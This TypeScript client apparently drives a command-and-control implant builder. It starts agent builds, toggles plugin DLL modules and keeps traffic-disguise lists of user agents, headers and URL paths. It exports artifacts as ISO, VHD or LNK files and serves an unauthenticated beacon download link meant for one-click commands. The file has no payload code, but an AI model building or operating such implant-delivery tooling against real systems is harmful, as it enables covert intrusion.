import { getToken, API_ORIGIN } from './client';
import type { BuildConfigRequest, BuildRecord, BuildRecordDetail, TemplateInfo } from '../types/models';

const API_BASE = `${API_ORIGIN}/api`;

export async function uploadIcon(file: File): Promise<string> {
  const formData = new FormData();
  formData.append('file', file);

  const response = await fetch(`${API_BASE}/builder/upload-icon`, {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${getToken()}`,
    },
    body: formData,
  });

  if (!response.ok) {
    const err = await response.json().catch(() => ({ error: 'Upload failed' }));
    throw new Error(err.error || `Upload failed (HTTP ${response.status})`);
  }

  const data = await response.json();
  return data.path;
}

export async function startBuild(config: BuildConfigRequest): Promise<string> {
  const response = await fetch(`${API_BASE}/builder/build`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${getToken()}`,
    },
    body: JSON.stringify(config),
  });

  if (!response.ok) {
    const err = await response.json().catch(() => ({ error: 'Build failed' }));
    throw new Error(err.error || `Build failed (HTTP ${response.status})`);
  }

  const data = await response.json();
  return data.buildId;
}

export function getBuildStreamUrl(buildId: string): string {
  return `${API_BASE}/builder/stream/${buildId}?token=${encodeURIComponent(getToken() || '')}`;
}

export async function listBuilds(): Promise<BuildRecord[]> {
  const response = await fetch(`${API_BASE}/builder/list`, {
    headers: { Authorization: `Bearer ${getToken()}` },
  });

  if (!response.ok) {
    throw new Error(`Failed to list builds (HTTP ${response.status})`);
  }

  return response.json();
}

export async function getBuildInfo(buildId: string): Promise<BuildRecordDetail> {
  const response = await fetch(`${API_BASE}/builder/info/${buildId}`, {
    headers: { Authorization: `Bearer ${getToken()}` },
  });

  if (!response.ok) {
    throw new Error(`Failed to get build info (HTTP ${response.status})`);
  }

  return response.json();
}

export function getBuildDownloadUrl(buildId: string): string {
  return `${API_BASE}/builder/download/${buildId}?token=${encodeURIComponent(getToken() || '')}`;
}

/** 按格式下载构建产物（iso/img/vhd/lnk；缺省 = 原始 exe）。 */
export function getBuildDownloadUrlByFormat(buildId: string, format: string): string {
  const token = encodeURIComponent(getToken() || '');
  return `${API_BASE}/builder/download/${buildId}?token=${token}&format=${encodeURIComponent(format)}`;
}

/** 匿名下载 URL（无需鉴权，供一键命令 / LNK 内嵌使用；删除构建即失效）。 */
export function getArtifactUrl(buildId: string): string {
  return `${API_ORIGIN}/api/beacon/artifact/${buildId}`;
}

export async function deleteBuild(buildId: string): Promise<void> {
  const response = await fetch(`${API_BASE}/builder/${buildId}`, {
    method: 'DELETE',
    headers: { Authorization: `Bearer ${getToken()}` },
  });

  if (!response.ok) {
    const err = await response.json().catch(() => ({ error: 'Delete failed' }));
    throw new Error(err.error || `Delete failed (HTTP ${response.status})`);
  }
}

export async function listTemplates(): Promise<TemplateInfo[]> {
  const response = await fetch(`${API_BASE}/builder/template`, {
    headers: { Authorization: `Bearer ${getToken()}` },
  });

  if (!response.ok) throw new Error(`Failed to list templates (HTTP ${response.status})`);
  return response.json();
}

export async function uploadTemplate(file: File, platform: string): Promise<TemplateInfo> {
  const formData = new FormData();
  formData.append('file', file);
  formData.append('platform', platform);

  const response = await fetch(`${API_BASE}/builder/template/upload`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${getToken()}` },
    body: formData,
  });

  if (!response.ok) {
    const err = await response.json().catch(() => ({ error: 'Upload failed' }));
    throw new Error(err.error || `Upload failed (HTTP ${response.status})`);
  }

  return response.json();
}

export async function deleteTemplate(platform: string): Promise<void> {
  const response = await fetch(`${API_BASE}/builder/template/${platform}`, {
    method: 'DELETE',
    headers: { Authorization: `Bearer ${getToken()}` },
  });

  if (!response.ok) {
    const err = await response.json().catch(() => ({ error: 'Delete failed' }));
    throw new Error(err.error || `Delete failed (HTTP ${response.status})`);
  }
}

/** 仅构建云模块（不构建 agent）。返回 buildId（历史/日志流用）。 */
export async function buildModules(platform: string, enabledModules: string[]): Promise<string> {
  const response = await fetch(`${API_BASE}/builder/modules`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${getToken()}`,
    },
    body: JSON.stringify({ platform, enabledModules }),
  });

  if (!response.ok) {
    const err = await response.json().catch(() => ({ error: 'Module build failed' }));
    throw new Error(err.error || `Module build failed (HTTP ${response.status})`);
  }

  const data = await response.json();
  return data.buildId;
}

export interface ModuleEntry {
  name: string;
  enabled: boolean;
}

/** 枚举平台模块（文件名驱动，含插件 dll）：{name, enabled}[]。 */
export async function listModules(platform: string): Promise<ModuleEntry[]> {
  const response = await fetch(`${API_BASE}/builder/modules?platform=${encodeURIComponent(platform)}`, {
    headers: { Authorization: `Bearer ${getToken()}` },
  });
  if (!response.ok) throw new Error(`Failed to list modules (HTTP ${response.status})`);
  const data = await response.json();
  return data.modules ?? [];
}

/** 启用/禁用模块（重命名 .dll ↔ .dll.disable）。 */
export async function toggleModule(platform: string, name: string, enabled: boolean): Promise<void> {
  const response = await fetch(`${API_BASE}/builder/modules/toggle`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${getToken()}`,
    },
    body: JSON.stringify({ platform, name, enabled }),
  });
  if (!response.ok) {
    const err = await response.json().catch(() => ({ error: 'Toggle failed' }));
    throw new Error(err.error || `Toggle failed (HTTP ${response.status})`);
  }
}

// ── 流量伪装持久化列表 ────────────────────────────────────────────────

export interface BuildListItem {
  id: string;
  value: string;
  enabled: boolean;
}

export interface BuildTrafficLists {
  userAgents: BuildListItem[];
  extraHeaders: BuildListItem[];
  pathSuffixes: BuildListItem[];
}

export type TrafficListName = 'userAgents' | 'extraHeaders' | 'pathSuffixes';

export async function getBuildLists(): Promise<BuildTrafficLists> {
  const response = await fetch(`${API_BASE}/builder/lists`, {
    headers: { Authorization: `Bearer ${getToken()}` },
  });
  if (!response.ok) throw new Error(`Failed to load lists (HTTP ${response.status})`);
  return response.json();
}

export async function addBuildListItem(list: TrafficListName, value: string): Promise<BuildTrafficLists> {
  const response = await fetch(`${API_BASE}/builder/lists/item`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${getToken()}`,
    },
    body: JSON.stringify({ list, value }),
  });
  if (!response.ok) {
    const err = await response.json().catch(() => ({ error: 'Add failed' }));
    throw new Error(err.error || `Add failed (HTTP ${response.status})`);
  }
  return response.json();
}

export async function toggleBuildListItem(list: TrafficListName, id: string, enabled: boolean): Promise<BuildTrafficLists> {
  const response = await fetch(`${API_BASE}/builder/lists/toggle`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${getToken()}`,
    },
    body: JSON.stringify({ list, id, enabled }),
  });
  if (!response.ok) {
    const err = await response.json().catch(() => ({ error: 'Toggle failed' }));
    throw new Error(err.error || `Toggle failed (HTTP ${response.status})`);
  }
  return response.json();
}

export async function deleteBuildListItem(list: TrafficListName, id: string): Promise<BuildTrafficLists> {
  const response = await fetch(`${API_BASE}/builder/lists/delete`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${getToken()}`,
    },
    body: JSON.stringify({ list, id }),
  });
  if (!response.ok) {
    const err = await response.json().catch(() => ({ error: 'Delete failed' }));
    throw new Error(err.error || `Delete failed (HTTP ${response.status})`);
  }
  return response.json();
}
